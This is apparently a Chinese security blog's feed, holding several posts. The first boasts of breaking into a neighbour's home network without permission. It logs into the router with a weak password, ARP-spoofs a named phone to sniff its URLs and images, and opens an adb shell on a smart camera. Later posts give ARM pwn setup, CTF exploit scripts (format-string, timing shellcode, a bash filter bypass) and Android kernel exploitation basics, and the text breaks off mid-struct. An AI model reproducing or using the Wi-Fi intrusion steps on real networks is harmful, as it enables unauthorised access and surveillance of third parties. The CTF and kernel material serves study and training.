    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。</p><h2 id="登录路由器后台"><a href="#登录路由器后台" class="headerlink" title="登录路由器后台"></a>登录路由器后台</h2><p>访问 192.168.1.1 直接连上了，竟然没有做一些限制，然后直接弱口令登陆进去了。看来隔壁家安全意识不高啊。</p><p>进去后台大致浏览了一遍，发现了连接的客户端，也没有静态ARP绑定设置，这样就可以玩ARP欺骗了。<br><img alt="" data-src="https://nocbtm.github.io/imgs/203-1.png" class="lozad"><br><img alt="" data-src="https://nocbtm.github.io/imgs/203-2.png" class="lozad"></p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>祭出尘封已久的kail,首先要把kail设为桥接模式，确保与物理机在同一网段。</p><p>然后 echo 1 &gt; /proc/sys/net/ipv4/ip_forward 进行ip转发，保证客户端的正常上网</p><p>这里用arpspoof工具来嗅探ip为192.168.1.145的荣耀V20<br>arpspoof -i eth0 -t 192.168.1.145 -r 192.168.1.1<br><img alt="" data-src="https://nocbtm.github.io/imgs/203-3.png" class="lozad"><br>执行上述命令后，arpspoofing将向路由器发送伪造请求。 此请求将路由器默认IP地址链接到kali linux mac地址</p><h3 id="获得目标设备的SNIFF网站"><a href="#获得目标设备的SNIFF网站" class="headerlink" title="获得目标设备的SNIFF网站"></a>获得目标设备的SNIFF网站</h3><p>打开另一个终端并输入urlsnarf -i eth0<br>Urlsnarf显示目标正在访问的所有网站，<br>-i用于输入网络接口名称。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-4.png" class="lozad"><br>可以看到目标正在玩QQ</p><h3 id="获得目标设备的SNIFF图像"><a href="#获得目标设备的SNIFF图像" class="headerlink" title="获得目标设备的SNIFF图像"></a>获得目标设备的SNIFF图像</h3><p>打开另一个终端并输入driftnet -i eth0<br>Driftnet显示了目标在互联网上访问的图像，如下所示。</p><p>-i用于输入网络接口名称。<br>一个新窗口将在kali linux中打开，并将嗅探目标正在访问的所有图像，嗅探到了大力的图片!<img alt="" data-src="https://i.loli.net/2020/02/03/MOaVpIRTfNLBK47.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-5.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-6.png" class="lozad"></p><h2 id="入侵智能摄像头"><a href="#入侵智能摄像头" class="headerlink" title="入侵智能摄像头"></a>入侵智能摄像头</h2><p>局域网内有一个未知的设备，用nmap扫了一下，发现开了554和5555端口；上网搜了一下，这两个端口都能搞事，应该是一个智能摄像头。社工了一波可能是小米家的小方摄像头。<br>554端口下的rtsp服务是实时流传输协议，是用来传输视频的<br>5555端口是用来远程调试的</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-7.png" class="lozad"></p><h3 id="554端口"><a href="#554端口" class="headerlink" title="554端口"></a>554端口</h3><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-8.png" class="lozad"></p><p>需要去插SD卡，不太好还是算了吧。我还是用VCL看流媒体吧,推荐几个可以测试的流媒体</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-9.png" class="lozad"></p><p>湖南卫视 rtmp://58.200.131.2:1935/livetv/hunantv<br>CCTV1高清 <a href="http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8" target="_blank" rel="noopener">http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8</a></p><h3 id="5555端口"><a href="#5555端口" class="headerlink" title="5555端口"></a>5555端口</h3><p>用adb远程连一下，可以连上<br>./adb connect  192.168.1.102:5555<br><img alt="" data-src="https://nocbtm.github.io/imgs/203-10.png" class="lozad"><br>./adb shell 开启shell，竟然直接进去了。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/203-11.png" class="lozad"></p><p>查看一下开启的端口，加载的驱动<br><img alt="" data-src="https://nocbtm.github.io/imgs/203-12.png" class="lozad"></p><p>接下来就是通过驱动来内核提权了，待我再研究一番来补上续集。</p><p>参考文章：<br>使用MITM监控流量（中间人攻击）<br><a href="http://www.kb-iot.com/post/706.html" target="_blank" rel="noopener">http://www.kb-iot.com/post/706.html</a><br>Wi-Fi 安全攻略<br><a href="https://www.secpulse.com/archives/5455.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/5455.html</a><br>Android-TV-adb-5555端口攻击说明<br><a href="https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html</a><br>常见网络摄像机的端口及RTSP地址<br><a href="https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/" target="_blank" rel="noopener">https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/</a><br>破解小方摄像头<br><a href="https://www.jianshu.com/p/7b56d3ae72f4" target="_blank" rel="noopener">https://www.jianshu.com/p/7b56d3ae72f4</a><br>routerpwn<br><a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。&lt;/p&gt;
&lt;h2 id=&quot;登录路由器后台&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="web" scheme="https://nocbtm.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://nocbtm.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>arm pwn 环境搭建</title>
    <link href="https://nocbtm.github.io/2020/01/21/arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2020/01/21/arm-pwn环境搭建/</id>
    <published>2020-01-21T10:05:00.000Z</published>
    <updated>2020-02-01T11:17:54.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="arm-pwn-环境搭建"><a href="#arm-pwn-环境搭建" class="headerlink" title="arm pwn 环境搭建"></a>arm pwn 环境搭建</h2><h3 id="qemu-简介"><a href="#qemu-简介" class="headerlink" title="qemu 简介"></a>qemu 简介</h3><p>qemu是一款可执行硬件虚拟化的虚拟机，与他类似的还有Bochs、PearPC，但qemu具有高速（配合KVM）、跨平台的特性<br>qemu主要有两种运行模式：qemu-user 和 qemu-system<br>安装 qemu-user<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure></p><p>此时可以运行静态链接的arm程序，而要运行动态链接的程序，需要安装对应架构的动态链接库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br></pre></td></tr></table></figure></p><p>安装 qemu-system<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu qemu-user-static qemu-system uml-utilities bridge-utils</span><br></pre></td></tr></table></figure></p><p>Ubuntu 16.04（deepin）<br>安装 gdb、gdb-multiarch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>安装 gdb plugin（peda、pwndbg、gef）</p><p>peda_arm：<a href="https://github.com/alset0326/peda-arm" target="_blank" rel="noopener">https://github.com/alset0326/peda-arm</a><br>pwndbg：<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg</a><br>gef：<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></p><p>配置qemu-system网络<br>qemu-system模式配置网络常见的方法是tap桥接<br>安装网络配置的依赖文件：<br>$ sudo apt install uml-utilities bridge-utils</p><p>修改Ubuntu主机网络接口配置文件：<br>$sudo vim /etc/network/interfaces</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>创建并编写qemu网络接口启动脚本：<br>$ sudo vim /etc/qemu-ifup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>保存文件后使用如下命令修改qemu-ifup的权限：<br>$ sudo chmod a+x /etc/qemu-ifup</p><p>重启网络使配置生效：<br>$ sudo /etc/init.d/networking restart    </p><p>启动桥接网络：<br>$ sudo ifdown ens33 &amp;&amp; sudo ifup br0<br>运行之后，桥br0代替ens33接管了ubuntu虚拟机的网口：</p><p>下载qemu的镜像和磁盘：<br><a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p><p>启动 qemu<br>./start.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>也可以使用docker运行一个qemu arm容器,比较方便<br><a href="https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8" target="_blank" rel="noopener">https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8</a></p><p><a href="https://github.com/fireundubh/IDA7-Rizzo" target="_blank" rel="noopener">https://github.com/fireundubh/IDA7-Rizzo</a> ida7.0，把rizzo.py放到ida插件文件夹里</p><p>参考文章：<a href="http://myhackerworld.top/2018/09/27/arm-pwn/" target="_blank" rel="noopener">http://myhackerworld.top/2018/09/27/arm-pwn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;arm-pwn-环境搭建&quot;&gt;&lt;a href=&quot;#arm-pwn-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm pwn 环境搭建&quot;&gt;&lt;/a&gt;arm pwn 环境搭建&lt;/h2&gt;&lt;h3 id=&quot;qemu-简介&quot;&gt;&lt;a href=&quot;#qemu-简
      
    
    </summary>
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/categories/arm-pwn/"/>
    
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/tags/arm-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019 xman writeup</title>
    <link href="https://nocbtm.github.io/2020/01/20/2019-xman-writeup/"/>
    <id>https://nocbtm.github.io/2020/01/20/2019-xman-writeup/</id>
    <published>2020-01-20T08:05:00.000Z</published>
    <updated>2020-02-02T02:25:04.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难点在于是堆上的格式化字符串漏洞，不能用常规的任意地址写手法</p><p><img alt="1580540236536.png" data-src="https://i.loli.net/2020/02/02/m8HcfNuhn37EIJL.png" class="lozad"></p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>寻找如下图合适的跳板，第一次修改跳板为函数返回地址所在的栈地址，第二次修改函数返回地址为后门的地址。</p><p><img alt="1580541684651.png" data-src="https://i.loli.net/2020/02/02/eXNLWR6oSnIOHsy.png" class="lozad"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>成功几率16分之一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">'debug'</span> </span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">5000</span>): </span><br><span class="line"><span class="comment">#with remote("node3.buuoj.cn",26370) as p: </span></span><br><span class="line"><span class="keyword">with</span> process(<span class="string">"./chall"</span>) <span class="keyword">as</span> p: </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">p.recvuntil(<span class="string">"...\n"</span>) </span><br><span class="line">gdb.attach(p,<span class="string">"b *0x080485F6"</span>)</span><br><span class="line">p.sendline(<span class="string">"%60c%10$hhn|%34219c%18$hnBBB"</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">"BBB"</span>) </span><br><span class="line"><span class="comment">#p.interactive() </span></span><br><span class="line">p.sendline(<span class="string">"ls"</span>) </span><br><span class="line">data = p.recvuntil(<span class="string">"flag"</span>) </span><br><span class="line">print(data) </span><br><span class="line"><span class="keyword">if</span>(<span class="string">"flag"</span> <span class="keyword">in</span> data): </span><br><span class="line">p.interactive() </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">print(<span class="string">'exception %s'</span> % e) </span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="nocall"><a href="#nocall" class="headerlink" title="nocall"></a>nocall</h2><p>64位程序，保护全开。题目提示输入shellcode,但这个题使用了seccomp机制，限制了execve系统调用。</p><p><img alt="1580542882966.png" data-src="https://i.loli.net/2020/02/02/sjCx4yRJo9XLfOd.png" class="lozad"><br><img alt="1580542965768.png" data-src="https://i.loli.net/2020/02/02/LIocbYu7xVNarG6.png" class="lozad"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>因为flag的地址已经暴露了，程序也开启了5秒的计时器，可以通过基于时间的方法爆破flag。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">s = <span class="string">'&#125;&#123;-0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x2000000000</span>,<span class="number">0x200000000</span>+<span class="number">0x30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload=asm(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            mov al,[&#123;&#125;]</span></span><br><span class="line"><span class="string">            mov bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">            cmp al,bl</span></span><br><span class="line"><span class="string">            jz loop</span></span><br><span class="line"><span class="string">            ret</span></span><br><span class="line"><span class="string">            """</span>.format(str(hex(i)),str(hex(ord(j)))))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#p = remote("node3.buuoj.cn",29793)</span></span><br><span class="line">            p = process(<span class="string">"./chall"</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Your Shellcode &gt;&gt;"</span>)</span><br><span class="line">            time1=time()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> str(hex(i))+<span class="string">"-----"</span>+j</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.can_recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            time2=time()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="comment">#pause()</span></span><br><span class="line">            <span class="keyword">if</span> time2-time1&gt;<span class="number">1</span>:</span><br><span class="line">                flag+=j</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="shellmaster"><a href="#shellmaster" class="headerlink" title="shellmaster"></a>shellmaster</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A=<span class="variable">$&#123;PATH##*:&#125;</span>;B=<span class="variable">$&#123;A%???&#125;</span>;<span class="variable">$PWD</span><span class="variable">$B</span>????</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;format&quot;&gt;&lt;a href=&quot;#format&quot; class=&quot;headerlink&quot; title=&quot;format&quot;&gt;&lt;/a&gt;format&lt;/h2&gt;&lt;p&gt;32位格式化字符串漏洞,只开了NX保护,有多次漏洞利用机会，并且有system(“/bin/sh”),题目难
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android kernel 入门</title>
    <link href="https://nocbtm.github.io/2020/01/12/Android%20kernel%20%E5%85%A5%E9%97%A8/"/>
    <id>https://nocbtm.github.io/2020/01/12/Android kernel 入门/</id>
    <published>2020-01-12T12:02:02.000Z</published>
    <updated>2020-02-02T02:30:03.072Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-系统架构"><a href="#Android-系统架构" class="headerlink" title="Android 系统架构"></a>Android 系统架构</h3><p>Android系统构架是安卓系统的体系结构，android的系统架构和其操作系统一样，采用了分层的架构，一般共分为四层，从高到低分别是：</p><ul><li>Android应用层 - 包括通话短信联系人这种系统级的应用，还包括用户自己安装的第三方应用</li><li>Android应用框架层 - 这一层大部分用Java写的，包括系统服务和四大组件</li><li>Android系统运行层  - 这一层大部分都是C/C++写的，主要是虚拟机 Dalvik/ART ，还有一些第三方库</li><li>Linux内核层 - 包含Linux内核和一些驱动，比如说蓝牙驱动，Camera驱动等等</li></ul><p>还有 HAL层-硬件抽象层</p><p>Android系统构架主要应用于ARM平台，但不仅限于ARM，通过编译控制，在X86、MAC等体系结构的机器上同样可以运行。<br><img alt="1579162747715.png" data-src="https://i.loli.net/2020/02/02/ZTSr8WpEQKBcz2o.png" class="lozad"></p><h3 id="Android进程间通信-binder"><a href="#Android进程间通信-binder" class="headerlink" title="Android进程间通信-binder"></a>Android进程间通信-binder</h3><ul><li>IPC(Inter-Process Communication)进程间通讯 </li><li>C（低权限应用）/S（高权限系统服务）</li><li>/dev/binder – framework和app之间IPC通信桥梁</li><li>/dev/hwbinder（8.0之后） – framework和vendor之间的IPC通信桥梁 </li><li>/dev/vndbinder（8.0之后） – vendor和vendor之间的IPC通信桥梁</li></ul><h3 id="SELinux限制"><a href="#SELinux限制" class="headerlink" title="SELinux限制"></a>SELinux限制</h3><p>Android 8.0之后推出厂商升级成本大大降低，8.0之后增加vendor.img镜像 ，攻击面大大减少， 很多厂商的代码不与应用层直接交互， 增加了应用和厂商代码的SELinux限制</p><h3 id="Android-内核攻击面"><a href="#Android-内核攻击面" class="headerlink" title="Android 内核攻击面"></a>Android 内核攻击面</h3><ul><li>应用直达内核路径寥寥无几 – /dev/binder、/dev/ashmem等</li><li>厂商自定义的驱动设备 – cat /proc/devices</li><li>应用 -&gt; system_server等 -&gt; 内核 </li><li>应用 -&gt; 系统应用 -&gt; system_server等 -&gt; 内核</li></ul><h3 id="Android内核缓释机制"><a href="#Android内核缓释机制" class="headerlink" title="Android内核缓释机制"></a>Android内核缓释机制</h3><ul><li>DAC/ CAP Linux最基本的安全缓释机制</li><li>PXN（Privileged Execute Never）类似于x86中的SMEP,防止内核态执行用户态代码,防御RET2USR攻击,可以通过修改rc4 来绕过。Android 5 arm64后开启，Android通过页表来开启PXN。<br><img alt="1579165663629.png" data-src="https://i.loli.net/2020/02/02/s5ISEpBU8m9Ng7u.png" class="lozad"></li><li>PAN (Privileged Access Never) 类似于x86中的SMAP ,防止内核任意读取用户态数据，Android 8.0之后加入。<br><img alt="1579166009547.png" data-src="https://i.loli.net/2020/02/02/tpbJR7ugO5scLB4.png" class="lozad"></li><li>SECCOMP 限制应用程序可以使用的系统调用，增加系统的安全性。shell中执行exp不会受到限制，apk中执行exp会受到seccomp限制，比如无法调到setuid、chroot、mount等。Android 8.0之后影响所有zygote孵化出来的进程。</li><li>KASLR 内核地址空间布局随机化，可以让kernel image映射的地址相对于链接地址有个偏移，利用需要泄露内核信息。Android kernel版本大于4.4之后默认开启。</li><li>AVB （Android  Verified Boot 启动时验证）启动时验证boot、system、vendor等是否被篡改，Persistent root 克星。Android 7.0 之后严格执行启动验证，Android 8.0 之后默认集成AVB2.0 ，有回滚保护，防止回滚到有漏洞的版本。</li></ul><h3 id="Android-内核漏洞利用基础知识"><a href="#Android-内核漏洞利用基础知识" class="headerlink" title="Android 内核漏洞利用基础知识"></a>Android 内核漏洞利用基础知识</h3><h4 id="内核关键数据结构"><a href="#内核关键数据结构" class="headerlink" title="内核关键数据结构"></a>内核关键数据结构</h4><ul><li><p>线程数据结构体，内核栈和hread_info共用一片区域 ,其中 addr_limit 用户态 0x7ffffffff000</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">union thread_union&#123;</span><br><span class="line">struct thread_info thread_info;</span><br><span class="line">unsigned long stack[THREAD_SIZE/sizeof(lone)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct thread_info&#123;</span><br><span class="line">unsigned long flag; /*low level flag*/</span><br><span class="line">mm_segment_t addr_limit; /*address limit */</span><br><span class="line">struct task_struct *task; </span><br><span class="line">struct exec_domain *exec_domian;  /* execution domain */</span><br><span class="line">struct restart_block restart_block;</span><br><span class="line">int preempt_count;</span><br><span class="line">int cpu;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>进程描述符</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">struct task_ struct &#123;</span><br><span class="line">volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */</span><br><span class="line">void *stack; // contains addr_ limi t</span><br><span class="line">unsigned int flags; /* per process flags, defined below */</span><br><span class="line">...</span><br><span class="line">struct list_ head tasks ;</span><br><span class="line">struct mm struct *mm， *active_ mm;</span><br><span class="line">#ifdef CONFIG COMPAT_ BRK</span><br><span class="line">unsigned brk randomized:1;</span><br><span class="line">...</span><br><span class="line">/* process credentials */</span><br><span class="line">const struct cred __rcu *real_cred; /* objective and real subjective task */</span><br><span class="line">consts truct cred __rcu *ered; /* effective (overridable) subjective task */</span><br><span class="line">char comm[TASK_COMM_LEN] ;</span><br><span class="line">...</span><br><span class="line">struct seccomp seccomp ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img alt="1579168735865.png" data-src="https://i.loli.net/2020/02/02/oBFsXaP8MplYzu1.png" class="lozad"></p><ul><li><p>安全凭证cred</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">unsigned int usage;</span><br><span class="line">uid_t uid;</span><br><span class="line">gid_t gid;</span><br><span class="line">uid_t suid;</span><br><span class="line">gid_t sgid; </span><br><span class="line">uid_t euid;</span><br><span class="line">gid_t egid;</span><br><span class="line">uid_t fsuid;</span><br><span class="line">gid_t fsgid;</span><br><span class="line">unsigned int securebits;</span><br><span class="line">struct kernel_cap_struct cap_inheritable;</span><br><span class="line">struct kernel_cap_struct Cap_permitted;</span><br><span class="line">struct kernel_cap_struct cap_ef fective;</span><br><span class="line">struct kernel_cap_struct cap_bset;</span><br><span class="line">struct kernel_cap_struct cap_ambient;</span><br><span class="line">void *security; /* subjective LSM security */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>安全凭证 task_secutity 安全域</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct task_ security_ struct &#123;</span><br><span class="line">u32 osid; /* SID prior to last execve */</span><br><span class="line">u32 sid; /* current SID */</span><br><span class="line">u32 